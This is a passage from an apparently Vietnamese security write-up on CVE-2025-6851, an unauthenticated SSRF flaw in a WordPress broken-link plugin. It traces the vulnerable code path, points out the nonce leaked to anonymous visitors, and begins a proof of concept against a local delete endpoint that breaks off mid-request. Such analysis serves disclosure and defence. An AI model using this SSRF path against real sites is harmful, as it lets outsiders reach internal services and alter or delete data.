$code === 0 &amp;amp;&amp;amp; ( $error == &amp;#39;A valid URL was not provided.&amp;#39; || strpos( $error, &amp;#39;cURL error 6: Could not resolve host&amp;#39; ) !== false ) ) {&#xA;        $code = 666;&#xA;    }&#xA;&#xA;    // Possible Codes&#xA;    $codes = $this-&amp;gt;get_status_codes();&#xA;&#xA;    // Files too large&#xA;    if ( $request_method == &amp;#39;GET&amp;#39; ) {&#xA;        $content_length = wp_remote_retrieve_header( $response, &amp;#39;content-length&amp;#39; );&#xA;        if ( $content_length &amp;amp;&amp;amp; $content_length &amp;gt; 10 * 1024 * 1024 ) { // 10 MB&#xA;            $code = 413;&#xA;        }&#xA;    }&#xA;    &#xA;    // Bad links&#xA;    if ( in_array( $code, $this-&amp;gt;get_bad_status_codes() ) ) {&#xA;        $type = &amp;#39;broken&amp;#39;;&#xA;&#xA;    // Warnings&#xA;    } elseif ( in_array( $code, $this-&amp;gt;get_warning_status_codes() ) ) {&#xA;        $type = &amp;#39;warning&amp;#39;;&#xA;&#xA;    // Good links&#xA;    } else {&#xA;        $type = &amp;#39;good&amp;#39;;&#xA;    }&#xA;&#xA;    // Filter status&#xA;    $status = apply_filters( &amp;#39;blnotifier_status&amp;#39;, [&#xA;        &amp;#39;type&amp;#39; =&amp;gt; $type,&#xA;        &amp;#39;code&amp;#39; =&amp;gt; $code,&#xA;        &amp;#39;text&amp;#39; =&amp;gt; ( $code !== 0 &amp;amp;&amp;amp; ( isset( $codes[ $code ] ) &amp;amp;&amp;amp; $codes[ $code ][ &amp;#39;msg&amp;#39; ] != &amp;#39;&amp;#39; ) ) ? $codes[ $code ][ &amp;#39;msg&amp;#39; ] : $error,&#xA;        &amp;#39;link&amp;#39; =&amp;gt; $url&#xA;    ] );&#xA;&#xA;    // Return the array&#xA;    return $status;&#xA;} // End check_url_status_code&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;check_url_status_code()&lt;/code&gt; c√≥ nhi·ªám v·ª• &lt;strong&gt;ki·ªÉm tra tr·∫°ng th√°i c·ªßa m·ªôt URL&lt;/strong&gt; v√† ph√¢n lo·∫°i n√≥ l√† &lt;strong&gt;good (t·ªët), warning (c·∫£nh b√°o) ho·∫∑c broken (h·ªèng)&lt;/strong&gt;. C·ª• th·ªÉ, ho·∫°t ƒë·ªông c·ªßa h√†m g·ªìm c√°c b∆∞·ªõc ch√≠nh:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;L·∫•y t√πy ch·ªçn c·∫•u h√¨nh&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;L·∫•y t√πy ch·ªçn &lt;code&gt;blnotifier_allow_redirects&lt;/code&gt; t·ª´ database v√† chuy·ªÉn v·ªÅ boolean ‚Üí Quy·∫øt ƒë·ªãnh xem request s·∫Ω d√πng &lt;strong&gt;GET&lt;/strong&gt; hay &lt;strong&gt;HEAD&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Ch·ªçn ph∆∞∆°ng th·ª©c request&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu &lt;code&gt;allow_redirects = true&lt;/code&gt;, m·∫∑c ƒë·ªãnh d√πng &lt;strong&gt;GET&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu URL l√† &lt;strong&gt;file media&lt;/strong&gt; (h√¨nh ·∫£nh, video, audio), h√†m s·∫Ω √©p d√πng &lt;strong&gt;HEAD&lt;/strong&gt; ƒë·ªÉ tr√°nh t·∫£i to√†n b·ªô file l·ªõn.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Ghi ch√∫&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;T√πy ch·ªçn n√†y ƒë∆∞·ª£c thi·∫øt l·∫≠p t·∫°i &lt;code&gt;http://localhost/wp-admin/admin.php?page=broken-link-notifier&amp;amp;tab=settings&lt;/code&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-28-cve-2025-6851/redirect_setting.png&#34; title=&#34;Allow Redirect settings&#34; data-thumbnail=&#34;/posts/2025-10-28-cve-2025-6851/redirect_setting.png&#34; data-sub-html=&#34;&lt;h2&gt;Redirect Setting&lt;/h2&gt;&lt;p&gt;Allow Redirect settings&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-28-cve-2025-6851/redirect_setting.png&#39; alt=&#34;Redirect Setting&#34; height=&#34;314&#34; width=&#34;1084&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Allow Redirect settings&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;X√°c ƒë·ªãnh user-agent&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;H√†m g·ªçi &lt;code&gt;$this-&amp;gt;get_user_agent()&lt;/code&gt; ƒë·ªÉ l·∫•y user-agent ph√π h·ª£p cho request.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Chu·∫©n h√≥a URL&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu URL b·∫Øt ƒë·∫ßu b·∫±ng &lt;code&gt;/&lt;/code&gt; ‚Üí n·ªëi v·ªõi &lt;code&gt;home_url()&lt;/code&gt; ƒë·ªÉ th√†nh URL tuy·ªát ƒë·ªëi.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu URL l√† &lt;strong&gt;link YouTube&lt;/strong&gt;, chuy·ªÉn sang endpoint &lt;code&gt;oembed&lt;/code&gt; ƒë·ªÉ l·∫•y th√¥ng tin an to√†n m√† kh√¥ng c·∫ßn truy c·∫≠p tr·ª±c ti·∫øp video.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;C·∫•u h√¨nh request:&#xA;X√¢y d·ª±ng m·∫£ng &lt;code&gt;$http_request_args&lt;/code&gt; ch·ª©a c√°c th√¥ng s·ªë cho request:&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;method&lt;/code&gt; (GET/HEAD)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;timeout&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;redirection&lt;/code&gt; (s·ªë l·∫ßn redirect t·ªëi ƒëa)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;sslverify&lt;/code&gt; (c√≥ ki·ªÉm tra SSL hay kh√¥ng)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;user-agent&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Th·ª±c hi·ªán request&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;G·ªçi &lt;code&gt;wp_remote_get($link, $http_request_args)&lt;/code&gt; ƒë·ªÉ l·∫•y response.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu kh√¥ng l·ªói ‚Üí l·∫•y &lt;strong&gt;status code&lt;/strong&gt; t·ª´ server.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu l·ªói ‚Üí l·∫•y th√¥ng b√°o l·ªói.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;X·ª≠ l√Ω c√°c URL kh√¥ng h·ª£p l·ªá&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;M·ªôt s·ªë l·ªói c∆° b·∫£n nh∆∞ kh√¥ng cung c·∫•p URL h·ª£p l·ªá ho·∫∑c kh√¥ng resolve ƒë∆∞·ª£c host ‚Üí g√°n code ƒë·∫∑c bi·ªát &lt;code&gt;666&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;X·ª≠ l√Ω file qu√° l·ªõn&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu request GET v√† &lt;strong&gt;content-length &amp;gt; 10MB&lt;/strong&gt;, g√°n code &lt;code&gt;413&lt;/code&gt; (Payload Too Large).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Ph√¢n lo·∫°i k·∫øt qu·∫£ d·ª±a tr√™n code HTTP tr·∫£ v·ªÅ:&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;broken&lt;/code&gt; ‚Üí URL h·ªèng&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;warning&lt;/code&gt; ‚Üí URL c·∫£nh b√°o&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;good&lt;/code&gt; ‚Üí URL h·ª£p l·ªá&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;10&#34;&gt;&#xA;&lt;li&gt;Tr·∫£ v·ªÅ k·∫øt qu·∫£: T·∫°o m·∫£ng &lt;code&gt;$status&lt;/code&gt; g·ªìm:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;type&lt;/code&gt; ‚Üí lo·∫°i URL (&lt;code&gt;good/warning/broken&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;code&lt;/code&gt; ‚Üí m√£ HTTP ho·∫∑c code ƒë·∫∑c bi·ªát&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;text&lt;/code&gt; ‚Üí th√¥ng b√°o (message ho·∫∑c l·ªói)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;link&lt;/code&gt; ‚Üí URL g·ªëc&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Cu·ªëi c√πng tr·∫£ v·ªÅ m·∫£ng n√†y ƒë·ªÉ plugin s·ª≠ d·ª•ng hi·ªÉn th·ªã tr·∫°ng th√°i URL.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition bug open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;H√†m n√†y ch·ªâ g·ª≠i request ƒë·∫øn URL v√† tr·∫£ v·ªÅ tr·∫°ng th√°i c·ªßa URL ƒë√≥, kh√¥ng l·∫•y ho·∫∑c tr·∫£ v·ªÅ n·ªôi dung file. V·∫•n ƒë·ªÅ SSRF xu·∫•t hi·ªán khi attacker cung c·∫•p URL tr·ªè t·ªõi c√°c d·ªãch v·ª• n·ªôi b·ªô ‚Äî server s·∫Ω th·ª±c hi·ªán request thay cho attacker, c√≥ th·ªÉ g√¢y ra c√°c h√†nh ƒë·ªông nh∆∞ thay ƒë·ªïi d·ªØ li·ªáu, x√≥a d·ªØ li·ªáu, qu√©t/ki·ªÉm tra c·ªïng n·ªôi b·ªô ho·∫∑c g·ªçi c√°c endpoint nh·∫°y c·∫£m. H√†m kh√¥ng cho ph√©p ƒë·ªçc tr·ª±c ti·∫øp n·ªôi dung file tr·∫£ v·ªÅ, nh∆∞ng vi·ªác th·ª±c hi·ªán request ƒë·∫øn c√°c internal service v·∫´n ƒë·ªß ƒë·ªÉ g√¢y t·ªïn h·∫°i.&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;&lt;code&gt;check_url_status_code()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi b√™n trong h√†m &lt;code&gt;check_link()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function check_link( $link ) {&#xA;    ...&#xA;    // Handle the filtered link if false&#xA;    if ( !$link ) {&#xA;    ...&#xA;    } elseif ( str_starts_with( $link, home_url() ) || ( str_starts_with( $link, &amp;#39;/&amp;#39; ) &amp;amp;&amp;amp; !str_starts_with( $link, &amp;#39;//&amp;#39; ) ) ) {&#xA;        &#xA;        // Check locally first&#xA;        if ( !url_to_postid( $link ) ) {                &#xA;&#xA;            // It may be redirected or an archive page, so let&amp;#39;s check status anyway&#xA;            // return $this-&amp;gt;check_url_status_code( $link );&#xA;            $status = $this-&amp;gt;check_url_status_code( $link );&#xA;            $CACHE-&amp;gt;set_cached_link( $status );&#xA;            return $status;&#xA;        }&#xA;    // Otherwise&#xA;    } else {&#xA;        // Skip url schemes&#xA;        foreach ( $this-&amp;gt;get_url_schemes() as $scheme ) {&#xA;            if ( str_starts_with( $link, $scheme.&amp;#39;:&amp;#39; ) ) {&#xA;                $status[ &amp;#39;text&amp;#39; ] = &amp;#39;Skipping: Non-Http URL Schema&amp;#39;;&#xA;                return $status;&#xA;            }&#xA;        }&#xA;&#xA;        // Return the status&#xA;        // return $this-&amp;gt;check_url_status_code( $link );&#xA;        $status = $this-&amp;gt;check_url_status_code( $link );&#xA;        $CACHE-&amp;gt;set_cached_link( $status );&#xA;        return $status;&#xA;    }&#xA;&#xA;    // Return the good status&#xA;    return $status;&#xA;} // End check_link()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;check_link()&lt;/code&gt; ki·ªÉm tra URL tr∆∞·ªõc khi g·ªçi &lt;code&gt;check_url_status_code()&lt;/code&gt;. N·∫øu link l√† n·ªôi b·ªô nh∆∞ng kh√¥ng tr·ªè t·ªõi post h·ª£p l·ªá (&lt;code&gt;elseif&lt;/code&gt;), ho·∫∑c l√† link ngo√†i site h·ª£p l·ªá(&lt;code&gt;else&lt;/code&gt;), h√†m s·∫Ω g·ªçi &lt;code&gt;check_url_status_code()&lt;/code&gt; ƒë·ªÉ l·∫•y tr·∫°ng th√°i (&lt;code&gt;good&lt;/code&gt;, &lt;code&gt;warning&lt;/code&gt;, &lt;code&gt;broken&lt;/code&gt;) v√† l∆∞u cache. Link tr·ªëng, kh√¥ng h·ª£p l·ªá, ho·∫∑c c√≥ scheme kh√¥ng h·ªó tr·ª£ s·∫Ω b·ªã b·ªè qua m√† kh√¥ng g·ª≠i request.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;check_link()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi b√™n trong h√†m &lt;code&gt;ajax_blinks()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function ajax_blinks() {&#xA;    // Verify nonce&#xA;    if ( !isset( $_REQUEST[ &amp;#39;nonce&amp;#39; ] ) || !wp_verify_nonce( sanitize_text_field( wp_unslash( $_REQUEST[ &amp;#39;nonce&amp;#39; ] ) ), $this-&amp;gt;nonce_blinks ) ) {&#xA;        exit( &amp;#39;No naughty business please.&amp;#39; );&#xA;    }&#xA;&#xA;    // Get the ID&#xA;    $source_url    = isset( $_REQUEST[ &amp;#39;source_url&amp;#39; ] ) ? filter_var( wp_unslash( $_REQUEST[ &amp;#39;source_url&amp;#39; ] ), FILTER_SANITIZE_URL ) : &amp;#39;&amp;#39;;&#xA;    $header_links  = isset( $_REQUEST[ &amp;#39;header_links&amp;#39; ] ) ? wp_unslash( $_REQUEST[ &amp;#39;header_links&amp;#39; ] ) : []; // phpcs:ignore WordPress.Security.&#xA;    ...&#xA;&#xA;    // Make sure we have a source URL&#xA;    if ( $source_url ) {&#xA;&#xA;        // Only allow webpages, not file:///, etc.&#xA;        if ( !str_starts_with( $source_url, &amp;#39;http&amp;#39; ) ) {&#xA;            wp_send_json_error( &amp;#39;Invalid source: &amp;#39; . $source_url );&#xA;        }&#xA;&#xA;        // Header links&#xA;        if ( !empty( $header_links ) ) {&#xA;            foreach ( $header_links as &amp;amp;$header_link ) {&#xA;                $count_links&amp;#43;&amp;#43;;&#xA;                $header_link = $HELPERS-&amp;gt;sanitize_link( $header_link );&#xA;                $status = $HELPERS-&amp;gt;check_link( $header_link );&#xA;                if ( in_array( $status[ &amp;#39;code&amp;#39; ], $notify_status_codes ) ) {&#xA;                    $count_notify&amp;#43;&amp;#43;;&#xA;                    $notify[ &amp;#39;header&amp;#39; ][] = $status;&#xA;                } else {&#xA;                    $good_links[ &amp;#39;header&amp;#39; ][] = $status;&#xA;                }&#xA;            }&#xA;        }&#xA;        ...&#xA;    } &#xA;    ...&#xA;} // End ajax_blinks()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho action hook v·ªõi hook name l√† &lt;code&gt;wp_ajax_nopriv_blnotifier_blinks&lt;/code&gt; d√†nh cho &lt;strong&gt;anonymous user&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private $ajax_key_blinks = &amp;#39;blnotifier_blinks&amp;#39;;&#xA;add_action( &amp;#39;wp_ajax_nopriv_&amp;#39;.$this-&amp;gt;ajax_key_blinks, [ $this, &amp;#39;ajax_blinks&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau ƒë√≥ th·ª±c hi·ªán c√°c ch·ª©c nƒÉng sau:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Check &lt;code&gt;nonce&lt;/code&gt; ƒë·ªÉ ch·ªëng CSRF&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Ghi ch√∫&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;V√¨ hook n√†y d√†nh cho &lt;strong&gt;anonymous user&lt;/strong&gt; n√™n &lt;code&gt;nonce&lt;/code&gt; c≈©ng s·∫Ω xu·∫•t hi·ªán trong m√£ ngu·ªìn trang ch·ªß tr·∫£ v·ªÅ.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-28-cve-2025-6851/nonce.png&#34; title=&#34;Nonce trong m√£ ngu·ªìn tr·∫£ v·ªÅ&#34; data-thumbnail=&#34;/posts/2025-10-28-cve-2025-6851/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Nonce trong m√£ ngu·ªìn tr·∫£ v·ªÅ&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-28-cve-2025-6851/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;439&#34; width=&#34;1543&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce trong m√£ ngu·ªìn tr·∫£ v·ªÅ&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;L·∫•y d·ªØ li·ªáu t·ª´ request&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;L·∫•y &lt;code&gt;source_url&lt;/code&gt; v√† c√°c link t·ª´ &lt;code&gt;header_links&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Ch·ªâ ch·∫•p nh·∫≠n &lt;code&gt;source_url&lt;/code&gt; b·∫Øt ƒë·∫ßu b·∫±ng &lt;code&gt;http&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Duy·ªát t·ª´ng &lt;code&gt;header_links&lt;/code&gt; link v√† g·ªçi &lt;code&gt;check_link()&lt;/code&gt; ƒë·ªÉ ki·ªÉm tra tr·∫°ng th√°i&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;code&gt;header_links&lt;/code&gt; ƒë∆∞·ª£c truy·ªÅn v√†o ·ªü d·∫°ng m·∫£ng: &lt;code&gt;header_link[0]=http://example.com&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph LR&#xA;    A[Anonymous Client g·ª≠i URL] --&amp;gt; B[ajax_blinks]&#xA;    B --&amp;gt; C[check_link]&#xA;    C --&amp;gt; D[check_url_status_code]&#xA;    D --&amp;gt; E[wp_remote_get v·ªõi URL user cung c·∫•p]&#xA;    E --&amp;gt; F[Response t·ª´ server]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;T·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, request&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/delete&amp;#39;, methods=[&amp;#39;GET&amp;#39;])&#xA;def delete():&#xA;    file_id = request.args.get(&amp;#39;id&amp;#39;)&#xA;    if not file_id:&#xA;        return &amp;#34;No id provided&amp;#34;, 400&#xA;    print(f&amp;#34;delete it: {file_id}&amp;#34;)&#xA;    return f&amp;#34;Delete it: {file_id}&amp;#34;&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Truy c·∫≠p trang ch·ªß v√† l·∫•y &lt;code&gt;nonce&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;G·ª≠i POST request ƒë·∫øn endpoint&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: 